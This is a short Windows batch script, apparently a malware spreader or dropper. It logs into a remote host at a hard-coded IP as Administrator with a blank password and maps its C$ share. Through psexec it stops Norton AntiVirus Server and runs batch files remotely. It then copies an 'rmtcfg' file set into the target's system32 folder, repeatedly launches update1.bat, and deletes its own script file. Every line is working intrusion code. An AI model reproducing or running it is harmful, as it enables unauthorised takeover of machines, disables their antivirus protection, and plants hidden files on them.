c:
cd\
cd c:\winnt\system32\rmtcfg\files\copy
copy rmtcfg.cfg c:\winnt\system32\rmtcfg\files\hm
c:
cd\
cd c:\winnt\system32\rmtcfg\files\hm
net use o: /delete
net use \\68.20.52.163 /USER:Administrator
net use o: \\68.20.52.163\C$
psexec \\68.20.52.163 -u Administrator -p "" net stop "Norton AntiVirus Server"
psexec \\68.20.52.163 -u Administrator -p "" -c temp.bat
mkdir o:\winnt\system32\rmtcfg
copy c:\winnt\system32\rmtcfg\files\hm\*.* o:\winnt\system32\rmtcfg
net use o: /delete
net use \\68.20.52.163 /delete
psexec \\68.20.52.163 -u Administrator -p "" -d c:\winnt\system32\rmtcfg\update1.bat
psexec \\68.20.52.163 -u Administrator -p "" -d c:\winnt\system32\rmtcfg\update1.bat
psexec \\68.20.52.163 -u Administrator -p "" -d c:\winnt\system32\rmtcfg\update1.bat
psexec \\68.20.52.163 -u Administrator -p "" -d c:\winnt\system32\rmtcfg\update1.bat
del runme522561.bat
